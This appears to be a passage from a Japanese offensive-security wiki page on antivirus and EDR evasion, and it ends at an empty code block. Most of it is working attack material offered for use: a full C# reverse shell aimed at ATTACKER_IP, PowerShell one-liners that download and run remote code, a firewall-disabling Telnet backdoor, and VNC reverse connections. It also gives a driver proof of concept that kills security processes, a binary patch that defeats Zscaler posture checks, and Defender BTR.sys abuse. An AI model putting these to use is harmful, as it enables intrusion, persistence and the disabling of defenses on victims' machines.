`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`は関数ごとのstubを出力し、`emitEndOfAsmFile()`はhandlerを出力します。emission段階間で共有されるsymbolにより、prologueのbranchから後で出力されるepilogueへジャンプできます。手動でnear `je`を出力する場合は、`0F 84`の後に4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallとjumpは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。変更を加えていない選択対象外の関数では、passは`false`を返す必要がありますが、PoCはその経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadataとpre-CRT initialization

PoCは、XOR keyと、loaderによってrelocateされた関数pointerおよび実行時の長さを含む16バイトのrecordを`.funcmeta`に配置します。Cのfieldは`uint32_t`ですが、handlerはrecordのオフセット`+8`にあるQWORDへアクセスし、長さとpaddingを読み込みます。また、recordを`0x10`ずつ進めます。PEのsection nameは8バイトしかないため、実行時のlookupでは`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stubに元のentry-point RVAを保存してから`AddressOfEntryPoint`を書き換えます。PIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+のimportをたどって、すでにimportされている`VirtualProtect`を解決して、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化では`gs:[0xE8]`にsentinelを設定し、metadata内のすべての関数を呼び出します。常に読み取り可能なprologueは、関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出すると、まだclearなbodyをスキップします。次にepilogueが`call handler`を実行します。handlerが13個のregister（`0x68`バイト）を保存した後、`[rsp+0x68]`のreturn addressが変換後の関数の終端になるため、`end - start`をmetadata recordに書き込めます。すべてのbodyをmaskした後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へジャンプします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称型handlerを呼び出してbodyをdecodeします。最後の経路は追加されたepilogueにフォールスルーし、それ以前のreturnはすべて共有handlerへ直接ジャンプします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再mask後にhandlerの`ret`が呼び出し元のreturn addressを消費し、関数の戻り値は`RAX`に保持されます。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitiveとanalysis indicators

handlerは現在のrecordを見つけ、固定長の可視prologue（このbuildでは`0x46`バイト）をスキップします。残りの領域を`PAGE_EXECUTE_READWRITE`に変更し、最下位key byteで1バイトずつXORした後、`PAGE_EXECUTE_READ`に設定します。この同じloopが、entry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この設計を示す、信頼度の高いindicatorには次のものがあります。<sup>[[38]](#references)[[39]](#references)</sup>

- 実行可能な`.stub`内にあるentry pointと、keyおよびrelocateされた`.text` pointerを格納する`.funcmet` section。
- pre-CRTでのPEB、import table、section tableの解析と、その後にmetadata pointerごとに行われるcall。
- 同一の`call`/`pop` PIC prologueと、単一のhandlerへリダイレクトされた多数のreturn site。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`へのwriteに続く、繰り返しの`VirtualProtect`による保護属性の切り替えと、image-backedな実行可能ページへのbyte単位のXOR write。

これはmemory-scanner evasionであり、暗号学的な保護ではありません。patch済みファイルには元のclearなbodyが残っており、debuggerで`VirtualProtect`やXOR loopにbreakpointを設定すれば、実行中の関数をdumpできます。1バイトXOR、読み取り可能なmetadata、固定の`0x46`境界により、オフラインでの復元も容易です。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotはthread-localですが、変更されたcode pageはprocess-wideです。そのため、並行実行や再帰的なentryによって、別のinvocationが実行中に命令が再度toggleされる可能性があります。また、exceptionやnonlocal exitによって再maskが実行されない場合もあります。堅牢な実装では、切り替えを同期し、`lpflOldProtect`を通じて返された実際のprotectionを復元し、hard-codedなstub lengthを避け、x64のstack alignmentに関して`call`と`jmp`の両経路を監査し、実行可能なbyteを書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能なcodeを変更する際のinstruction-cache coherencyはcallerの責任であると明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行する際に、この画面が表示されたことがあるかもしれません。

Microsoft Defender SmartScreenは、エンドユーザーが悪意のある可能性があるアプリケーションを実行しないよう保護するためのsecurity mechanismです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-basedな方式で動作します。つまり、あまりダウンロードされていないアプリケーションではSmartScreenが起動し、エンドユーザーに警告してファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。インターネットからファイルをダウンロードすると、そのファイルのダウンロード元URLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認しています。</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名された実行ファイルでは、**SmartScreenは起動しません**。

payloadにMark of The Webが付与されないようにする非常に効果的な方法は、ISOなどのcontainerにpayloadをパッケージ化することです。これは、Mark-of-the-Web（MOTW）を**非NTFS** volumeに適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するため、payloadをoutput containerにパッケージ化するtoolです。

使用例：

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

これは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使って payload を ISO ファイルに格納し、SmartScreen を回避するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windows の強力なログ記録機構です。ただし、セキュリティ製品が悪意のあるアクティビティを監視・検出するためにも利用されます。

AMSI を無効化（バイパス）するのと同様に、ユーザースペースプロセスの **`EtwEventWrite`** 関数を、イベントを記録せずに即座に戻るようにすることもできます。関数をメモリ上でパッチして即座に戻るようにすることで、そのプロセスの ETW ログ記録を実質的に無効化します。

詳しくは、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# バイナリをメモリ上にロードする手法は以前から知られており、AV に検知されずに post-exploitation ツールを実行する方法として、今も非常に有効です。

payload はディスクに触れることなくメモリに直接ロードされるため、プロセス全体で AMSI をパッチすることだけを考慮すればよいです。

ほとんどの C2 framework（sliver、Covenant、metasploit、CobaltStrike、Havoc など）は、すでに C# assemblies をメモリ上で直接実行する機能を備えていますが、実行方法はいくつかあります。

- **Fork\&Run**

**新しい sacrificial process を起動し**、そのプロセスに post-exploitation 用の悪意のあるコードを inject して実行し、完了後にプロセスを終了させる方法です。この方法にはメリットとデメリットがあります。Fork and Run 方式のメリットは、Beacon implant プロセスの**外部**で実行されることです。つまり、post-exploitation のアクションで問題が発生したり検知されたりしても、**implant が生き残る可能性が大幅に高くなります**。デメリットは、**行動検知**に検知される可能性が**高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation 用の悪意のあるコードを**自身のプロセスに** inject する方法です。これにより、新しいプロセスを作成して AV にスキャンされるのを避けられますが、payload の実行中に問題が発生すると、クラッシュする可能性があるため、**beacon を失う可能性が大幅に高くなります**。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

C# Assemblies は**PowerShell から**ロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t の動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を確認してください。

## 他のプログラミング言語を使う

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、侵害したマシンから**攻撃者が管理する SMB share 上にインストールされた interpreter 環境**にアクセスさせることで、他の言語を使って悪意のあるコードを実行できます。

SMB share 上の Interpreter Binaries と環境へのアクセスを許可することで、侵害したマシンのメモリ内で、これらの言語による**任意のコードを実行できます**。

この repo によると、Defender はスクリプトを引き続きスキャンしますが、Go、Java、PHP などを利用することで、**静的なシグネチャを回避する柔軟性が高まります**。これらの言語でランダムな難読化されていない reverse shell スクリプトを使ってテストしたところ、成功しています。

## TokenStomping

Token stomping は、EDR や AV などのセキュリティ製品の access token を操作します。token の権限を下げることで、プロセスを実行状態に保ちながら、特権を必要とする検査や修復の実行を防げる場合があります。

これを防ぐために、Windows が**外部プロセスによる**セキュリティプロセスの token への handle 取得を防ぐ可能性があります。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアを使う

### Chrome Remote Desktop

[**こちらのブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者の PC に Chrome Remote Desktop を導入し、それを使って乗っ取り、永続化を維持するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者のマシンでインストーラーをサイレント実行します（管理者権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻って「Next」をクリックします。ウィザードで認証を求められるので、「Authorize」ボタンをクリックして続行します。
4. 必要な箇所を変更して、指定されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` パラメーターを使うと、GUI を使用せずに PIN を設定できます。）


## 高度な回避

回避は非常に複雑なテーマです。1つのシステムでも複数のテレメトリソースを考慮する必要がある場合があり、成熟した環境で完全に検知を回避するのはほぼ不可能です。

対処する環境ごとに、それぞれ異なる強みと弱点があります。

高度な回避テクニックの基礎を学ぶために、[@ATTL4S](https://twitter.com/DaniLJ94) のこの講演をぜひご覧ください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは、[@mariuszbit](https://twitter.com/mariuszbit) による、Evasion in Depth に関するもう一つの素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古いテクニック**

### **Defender が悪意のあるものとして検出する箇所を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリの一部を**取り除きながら**、Defender が悪意のあるものとして検出している箇所を特定し、分割して表示できます。\
同じことを行う別のツールは [**avred**](https://github.com/dobin/avred) です。ウェブ上で [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) からサービスを利用できます。

### **Telnet Server**

Windows 10 までは、すべての Windows に**Telnet server**が付属しており、管理者として次のコマンドを実行すればインストールできました。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システムの起動時に**開始**するように設定し、今すぐ**実行**します：

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更（ステルス）し、ファイアウォールを無効化する:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

こちらからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup ではなく、bin downloads が必要です)

**ホスト上で**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と新しく作成されたファイル _**UltraVNC.ini**_ を **被害者** の環境に移動します

#### **Reverse connection**

**攻撃者** は、自身の **ホスト内で** バイナリ `vncviewer.exe -listen 5900` を実行し、Reverse **VNC connection** を受け取れる状態にします。次に、**被害者** の環境で、winvnc デーモンを起動します `winvnc.exe -run`。その後、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルス性を維持するには、次のことを避けてください

- `winvnc` がすでに実行中の場合は起動しないでください。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認してください
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプを表示するために `winvnc -h` を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

こちらからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT 内:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc` で **listener を起動**し、次の方法で **xml payload** を **実行**します:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在の Defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルします:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のものと併用します：

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators の一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Pythonを使ったinjectorのビルド例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### さらに

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ランサムウェアを投下する前にエンドポイント保護を無効化するため、**Antivirus Terminator** と呼ばれる小さなコンソールユーティリティを利用しました。このツールは**独自の脆弱だが *署名済み* のドライバー**を持ち込み、それを悪用して、Protected-Process-Light (PPL) AV サービスでさえ阻止できない、特権を要するカーネル操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済みドライバー**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、バイナリは Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に署名されたドライバー `AToolsKrnl64.sys` です。このドライバーには有効な Microsoft 署名が付いているため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   最初の行はドライバーを **kernel service** として登録し、2 行目はそれを起動します。これにより、`\\.\ServiceMouse` がユーザーランドからアクセス可能になります。
3. **ドライバーが公開する IOCTL**
   | IOCTL コード | 機能                                      |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID を指定して任意のプロセスを終了する（Defender/EDR サービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードし、サービスを削除する |

   最小限の C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD はユーザーモードの保護を完全に回避します。カーネルで実行されるコードは、PPL/PP、ELAM、その他のハードニング機能に関係なく、*保護された*プロセスを開いたり、終了させたり、カーネルオブジェクトを改ざんしたりできます。

検出 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にして、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *カーネル* サービスの作成を監視し、ドライバーが誰でも書き込み可能なディレクトリから読み込まれた場合や、許可リストにない場合にアラートを出します。
•  ユーザーモードのハンドルがカスタムデバイスオブジェクトにアクセスした後に、不審な `DeviceIoControl` 呼び出しが行われていないか監視します。

### ディスク上のバイナリのパッチ適用による Zscaler Client Connector の姿勢チェックの回避

Zscaler の **Client Connector** はデバイス姿勢ルールをローカルで適用し、その結果を他のコンポーネントに伝えるために Windows RPC に依存しています。設計上の弱点が2つあるため、完全な回避が可能です。

1. 姿勢の評価は **完全にクライアント側で** 行われる（ブール値がサーバーに送信される）。
2. 内部 RPC エンドポイントは、接続する実行ファイルが（`WinVerifyTrust` によって）**Zscaler によって署名されている**ことだけを検証する。<sup>[[11]](#references)</sup>

**署名済みバイナリ4つにディスク上でパッチを適用する**ことで、両方の仕組みを無効化できます。

| バイナリ | パッチを適用する元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返し、すべてのチェックを準拠済みにする |
| `ZSAService.exe` | `WinVerifyTrust` の間接呼び出し | NOP-ed ⇒ 署名のないプロセスも含め、あらゆるプロセスが RPC パイプに接続可能 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換える |
| `ZSATunnel.exe` | トンネルの整合性チェック | ショートサーキット化 |

パッチ適用ツールの最小限の抜粋：

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動すると、次の状態になります。

* posture checks は**すべて**緑色／compliant と表示されます。
* 署名されていないバイナリや改変されたバイナリから、名前付きパイプの RPC エンドポイント（例：`\\RPC Control\\ZSATrayManager_talk_to_me`）を開けます。
* 侵害されたホストは、Zscaler のポリシーで定義された内部ネットワークに無制限にアクセスできるようになります。

このケーススタディでは、クライアント側だけで行われる信頼判断と単純な署名チェックが、わずかなバイトパッチで回避できることを示します。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** ドライバーは、従来の BYOVD に対する有用な反例です。`BTR.sys` は、メモリ破損バグも IOCTL インターフェースもない、Microsoft が正規に署名した修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、攻撃者は代わりに非公開の修復トランザクションを偽造し、意図された Ring-0 のファイル／レジストリ操作を実行できます。これは**侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製ドライバーを持ち込むのではなく、標的自身の `MpEngine.dll` にある `BOOTTIMETOOL` リソースからドライバーを抽出できます。<sup>[[36]](#references)</sup>

### 使い捨てドライバーのステージング

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとして展開し、同様の名前のカーネルサービスを登録します。`DriverEntry` はサービスの `Args` 値を読み取り、指定された NTFS ADS を開いて、アクションリストを復号・検証し、フィードバックを書き込みます。実行が成功すると、ドライバーが常駐せずにアンロードされるよう、`0xC0000056`（`STATUS_DELETE_PENDING`）を返します。偽造したサービスには、次のような特徴的な値を設定します。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化された blob が1つ含まれます。解析したビルドでは固定の256バイトキーが再利用されるため、暗号化は認可の境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されるトランザクションID）に続いて、ヌル終端されたUTF-16のfeedbackパスと、任意の数のアイテムで構成されます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、その末尾は**必ず4つのNULバイト**です。各ヘッダー領域とデータ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。領域ごとにCRCの状態はリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDによって、次のカーネルプリミティブが利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16パス]` | ロック中のファイルを含むファイルの削除 |
| 2 | `[UTF-16パス]` | 空のディレクトリの削除 |
| 3 | `[Flags][source][destination]` | 攻撃者が選択した保護対象パスへのファイルの移動。destinationが空の場合は削除 |
| 4 | `[Flags][key path]` | レジストリキーの再帰的な削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値の削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値の作成または更新、および存在しないキーのパスの作成 |

アクション5と6では、オンワイヤ上のキーと値の区切り文字は**連続する2つのバックスラッシュ**です。一般的な形式のパスでは正しく分割されません。feedbackファイルはリクエストの内容をほぼそのまま反映しますが、各アイテムのデータの先頭4バイトは、処理結果の`NTSTATUS`になります。先頭にflagsフィールドがないアクション1と2では、BTRはそのステータス用の領域を確保するため、パスを末尾の予約済み4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI`のワークフローと早期ブート時の実行機会

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は、一連の手順をすべて実装しています。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とfeedbackストリームを作成して、連鎖するアクションをシリアライズ、チェックサム計算、暗号化します。続いてサービスのレジストリキーを直接作成し、`-trigger now`の場合は`NtLoadDriver`を呼び出します。`-trigger boot`の場合は、システム起動時に開始するドライバーとして残します。レジストリに直接ステージングすることで、通常のSCMの`CreateServiceW`経路を避けるため、サービスインストールのイベントID 7045は記録されません。ブートトリガーで作成されたアーティファクトは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
